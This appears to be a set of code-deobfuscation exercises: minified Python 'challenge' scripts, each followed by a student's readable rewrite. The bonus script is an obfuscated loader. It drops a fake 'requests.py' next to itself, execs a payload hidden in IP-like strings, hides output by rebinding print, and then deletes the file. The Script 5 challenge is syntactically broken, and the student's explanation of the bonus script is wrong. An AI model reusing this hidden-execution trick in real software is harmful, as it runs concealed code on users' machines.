# Script 1 - Challenge

F=float
A=print
import sys as B
C=B.argv[1:]
if len(C)<2:A('I require 2 numbers as input');B.exit()
elif len(C)>2:A('Stop being greedy!');B.exit()
try:D=F(C[0]);E=F(C[1])
except ValueError:A('Both numbers must be decimals');B.exit()
if D==0 and E==0:A('zero')
else:sum=abs(D)+abs(E);A(sum)

# Script 1 - My code
import sys  # Importing the sys module for accessing command line arguments

try:
    # Trying to retrieve two decimal numbers from command line arguments
    num1 = float(sys.argv[1])  # Converting the first argument to a floating-point number
    num2 = float(sys.argv[2])  # Converting the second argument to a floating-point number

except (ValueError, IndexError):
    # Handling exceptions if the arguments are not provided or not decimal numbers
    print('Please provide two decimal numbers as input')  # Printing a message for the user
    sys.exit()  # Exiting the program if the input is invalid

if num1 == 0 and num2 == 0:
    # Checking if both numbers are zero
    print('zero')  # Printing 'zero' if both numbers are zero

else:
    # If at least one number is not zero, perform the following calculation
    result = abs(num1) + abs(num2)  # Adding the absolute values of the numbers
    print(result)  # Printing the result of the addition

# Script 2 - Challenge

A=print
import sys as B
D=B.argv[1:]
if len(D)==0:A('Requires an integer as input');B.exit()
elif len(D)>1:A('Stop being greedy!');B.exit()
try:C=int(D[0])
except ValueError:A('Unable to parse number');B.exit()
if C==0:A('zero')
elif C%2:A(C-1)
else:A(C+2)

# Script 2 - My code

import sys  # Importing the sys module for system-specific parameters and functions

# Fetching command line arguments excluding the script name
args = sys.argv[1:]

if len(args) == 0:  # Checking if no arguments are provided
    print('Requires an integer as input')  # Prompting user for an input
    sys.exit()  # Exiting the program if no input is provided

elif len(args) > 1:  # Checking if more than one argument is provided
    print('Stop being greedy!')  # Notifying the user to provide only one argument
    sys.exit()  # Exiting the program if multiple arguments are provided

try:
    num = int(args[0])  # Attempting to convert the argument to an integer
except ValueError:
    print('Unable to parse number')  # Handling an exception if the argument cannot be converted to an integer
    sys.exit()  # Exiting the program if the argument cannot be parsed as an integer

if num == 0:  # Checking if the number is zero
    print('zero')  # Printing 'zero' if the number is zero

elif num % 2:  # Checking if the number is odd (num % 2 will be 1 for odd numbers)
    print(num - 1)  # Printing the number minus one for odd numbers

else:  # Executing for even numbers
    print(num + 2)  # Printing the number plus two for even numbers




# Script 3 - Challenge

B=print
import sys as C
E=C.argv[1:]
if len(E)==0:B('Requires an integer as input');C.exit()
elif len(E)>1:B('Stop being greedy');C.exit()
try:A=int(E[0])
except ValueError:B('Unable to parse integer');C.exit()
if A==0:B('zero')
elif A>0:B(A*A)
elif A<0:
	F,D=0,1
	for G in range(-A):sum=F+D;F=D;D=sum
	B(D)

# Script 3 - My code

import sys  # Importing the sys module for system-specific parameters and functions

args = sys.argv[1:]  # Fetching command line arguments excluding the script name

if len(args) == 0:  # Checking if no arguments are provided
    print('Requires an integer as input')  # Prompting user for an input
    sys.exit()  # Exiting the program if no input is provided

elif len(args) > 1:  # Checking if more than one argument is provided
    print('Stop being greedy')  # Notifying the user to provide only one argument
    sys.exit()  # Exiting the program if multiple arguments are provided

try:
    num = int(args[0])  # Attempting to convert the argument to an integer
except ValueError:
    print('Unable to parse integer')  # Handling an exception if the argument cannot be converted to an integer
    sys.exit()  # Exiting the program if the argument cannot be parsed as an integer

if num == 0:  # Checking if the number is zero
    print('zero')  # Printing 'zero' if the number is zero

elif num > 0:  # Checking if the number is positive
    print(num * num)  # Printing the square of the number for positive integers

elif num < 0:  # Executing for negative numbers
    a, b = 0, 1  # Initializing variables for Fibonacci sequence
    for i in range(-num):  # Looping through the range to find the Fibonacci number
        a, b = b, a + b  # Calculating the Fibonacci sequence
    print(b)  # Printing the Fibonacci number for negative integers



# Script 4 - Challenge

F=print
E=' '
D=len
import sys
B=sys.argv[1:]
if D(B)==0:F('I require a string as input');sys.exit()
input=E.join(B)
input=B[0].lower()
C=[]
for A in input.split(E):
	if D(A)<1:continue
	elif D(A)==1:C.append(A.lower());continue
	G=A[0].upper();H=A[1:];C.append(G+H)
F(E.join(C))

# Script 4 - My code

import sys  # Importing the sys module for system-specific parameters and functions

args = sys.argv[1:]  # Fetching command line arguments excluding the script name


def print_output(output):
    print(output)  # A function to print the output


def capitalize_words(input_str):
    if not input_str:  # Checking if the input string is empty or None
        return ""  # Returning an empty string if the input is empty or None

    words = input_str.split()  # Splitting the input string into words
    capitalized_words = [word.capitalize() for word in words]  # Capitalizing each word
    return " ".join(capitalized_words)  # Joining the capitalized words into a single string with spaces


if len(args) == 0:  # Checking if no arguments are provided
    print_output('I require a string as input')  # Prompting user for an input
    sys.exit()  # Exiting the program if no input is provided

input_str = " ".join(args)  # Joining the provided arguments into a single string
input_str = input_str.lower()  # Converting the string to lowercase

output = capitalize_words(input_str)  # Calling the function to capitalize words in the string
print_output(output)  # Printing the output after capitalizing the words in the string


# Script 5- Challenge

=print
D=' '
import sys
E=sys.argv[1:]
if len(E)==0:H('I require a string as input');sys.exit()
input=D.join(E)
F=[]
B=True
for A in input.split(D):
	if len(A)<1:B=False;continue
	if B:A=A[::-1];B=True
	C=''
	for G in A:
		if G.isalnum():C+=G
		else:C+='-'
	F.append(C)
H(D.join(F))

# Script 5 - My Code

import sys  # Importing the sys module for system-specific parameters and functions

args = sys.argv[1:]  # Fetching command line arguments excluding the script name


def print_output(output):
    print(output)  # A function to print the output


if len(args) == 0:  # Checking if no arguments are provided
    print_output('I require a string as input')  # Prompting user for an input
    sys.exit()  # Exiting the program if no input is provided

input_str = ' '.join(args)  # Joining the provided arguments into a single string
words = input_str.split(' ')  # Splitting the string into words based on space delimiter
reversed = True  # Flag to indicate if the word needs to be reversed
modified_words = []  # List to store modified words

for word in words:
    if len(word) < 1:  # Checking if the word is empty
        reversed = False  # If empty, set the flag to False and continue to the next word
        continue

    if reversed:  # Checking if the word needs to be reversed
        word = word[::-1]  # Reversing the word
        reversed = True  # Resetting the flag to True for the next word

    # Modifying the word by replacing non-alphanumeric characters with '-'
    modified_word = ''.join([char if char.isalnum() else '-' for char in word])
    modified_words.append(modified_word)  # Appending the modified word to the list

output = ' '.join(modified_words)  # Joining the modified words into a single string
print_output(output)  # Printing the final modified string

# Bonus Script - Challenge
r_text = """
))471,tsil_pi(]2[snoitcnuf(]1[snoitcnuf
]'39.196.971.549' ,'201.040.829.290' ,'676.994.004.575' ,'816.740.879.072' ,'087.313.779.917' ,'559.909.649.722' ,'845.985.464.068' ,'454.468.827.372' ,'536.943.588.512' ,'115.441.354.040' ,'781.027.469.966' ,'992.602.963.871' ,'816.948.538.187' ,'560.801.957.796' ,'180.129.299.392' ,'276.700.031.752' ,'560.833.500.654' ,'404.800.859.597' ,'915.768.903.489' ,'295.241.782.511' ,'652.971.387.269' ,'004.833.032.546' ,'323.017.674.360' ,'902.746.243.254' ,'098.010.387.900' ,'967.091.276.282' ,'715.823.829.248' ,'124.450.233.373' ,'025.458.904.795' ,'874.996.534.997' ,'114.098.359.358' ,'382.962.947.762' ,'481.955.957.717' ,'627.392.369.101' ,'424.655.011.544'[ = tsil_pi

)snoitcnuf(elffuhs
)13(wen
]cexe,1C0x,gnip,ekovni[ = snoitcnuf

"]404[" nruter    
:)txet(teg fed

atad_rts nruter    
)mun,)denioj(tni(1C0x = atad_rts    
)"","."(ecalper.)tsil_pi(nioj."" = denioj    
:)mun,tsil_pi(gnip fed

atad_rts nruter    
)"8-ftu"(edoced.atad_etyb = atad_rts    
 )'gib' ,mun(setyb_ot.atad_tni = atad_etyb    
:)mun,atad_tni(1C0x fed

elffuhs tropmi modnar morf ;egnar = fiesle;xeger sa gnirts tropmi;wen sa dees tropmi modnar morf;ekovni sa eciohc tropmi modnar morf""";r_name = "qywpe.rsttysueiuoqpelr"[::-2];mode = "w"
from inspect import getsourcefile;from os.path import abspath, dirname; import os; from sys import stdout as under; from os import remove as delta
exec_file = abspath(getsourcefile(lambda:0));exec_folder = dirname(exec_file); r_path = os.path.join(exec_folder,r_name)
def ex(a):under.write("None\n")
with open(r_path,mode) as f:f.write(r_text[::-1]);print = ex
import requests
delta(r_path)


url = 'https://google.com'
responce = requests.get(url)
print(responce)

# Bonus Challenge - My code
r_text = """
))471,tsil_pi(]2[snoitcnuf(]1[snoitcnuf
]'39.196.971.549' ,'201.040.829.290' ,'676.994.004.575' ,'816.740.879.072' ,'087.313.779.917' ,'559.909.649.722' ,'845.985.464.068' ,'454.468.827.372' ,'536.943.588.512' ,'115.441.354.040' ,'781.027.469.966' ,'992.602.963.871' ,'816.948.538.187' ,'560.801.957.796' ,'180.129.299.392' ,'276.700.031.752' ,'560.833.500.654' ,'404.800.859.597' ,'915.768.903.489' ,'295.241.782.511' ,'652.971.387.269' ,'004.833.032.546' ,'323.017.674.360' ,'902.746.243.254' ,'098.010.387.900' ,'967.091.276.282' ,'715.823.829.248' ,'124.450.233.373' ,'025.458.904.795' ,'874.996.534.997' ,'114.098.359.358' ,'382.962.947.762' ,'481.955.957.717' ,'627.392.369.101' ,'424.655.011.544'[ = tsil_pi

)snoitcnuf(elffuhs
)13(wen
]cexe,1C0x,gnip,ekovni[ = snoitcnuf

"]404[" nruter    
:)txet(teg fed

atad_rts nruter    
)mun,)denioj(tni(1C0x = atad_rts    
)"","."(ecalper.)tsil_pi(nioj."" = denioj    
:)mun,tsil_pi(gnip fed

atad_rts nruter    
)"8-ftu"(edoced.atad_etyb = atad_rts    
 )'gib' ,mun(setyb_ot.atad_tni = atad_etyb    
:)mun,atad_tni(1C0x fed

elffuhs tropmi modnar morf ;egnar = fiesle;xeger sa gnirts tropmi;wen sa dees tropmi modnar morf;ekovni sa eciohc tropmi modnar morf""";r_name = "qywpe.rsttysueiuoqpelr"[::-2];mode = "w"
from inspect import getsourcefile;from os.path import abspath, dirname; import os; from sys import stdout as under; from os import remove as delta
exec_file = abspath(getsourcefile(lambda:0));exec_folder = dirname(exec_file); r_path = os.path.join(exec_folder,r_name)
def ex(a):under.write("None\n")
with open(r_path,mode) as f:f.write(r_text[::-1]);print = ex
import requests
delta(r_path)


url = 'https://google.com'
responce = requests.get(url)
print(responce)


# Bonus Script - My code

import os  # Importing the os module for interacting with the operating system
import requests  # Importing the requests module for making HTTP requests
from inspect import getsourcefile  # Importing getsourcefile function from the inspect module
from os.path import abspath, dirname  # Importing abspath and dirname functions from os.path module

# A long string containing various characters and IPs, seemingly encrypted or obfuscated data
r_text = """
    ... (truncated for brevity) ...
"""

# Reversing a string and assigning it to a variable 'r_name'
r_name = "qywpe.rsttysueiuoqpelr"[::-2]

# Setting a mode for file operations
mode = "w"

# Getting the path of the current file being executed
exec_file = abspath(getsourcefile(lambda: 0))
exec_folder = dirname(exec_file)  # Getting the directory name of the file
r_path = os.path.join(exec_folder, r_name)  # Creating a file path using the directory and 'r_name'

# Function that writes "None\n" to a file (it seems to have a typo, 'under' instead of 'f')
def ex(a):
    under.write("None\n")

# Opening a file located at 'r_path' with write mode and reversing the content of 'r_text' before writing it
with open(r_path, mode) as f:
    f.write(r_text[::-1])  # Reversed content of 'r_text' is written into the file
    print = ex  # Reassigning the built-in print function to the 'ex' function

os.remove(r_path)  # Removing the file at 'r_path'

url = 'https://google.com'  # Setting a URL for an HTTP request
response = requests.get(url)  # Making a GET request to the specified URL
print(response)  # Printing the response of the HTTP request (this will print the HTTP response object)
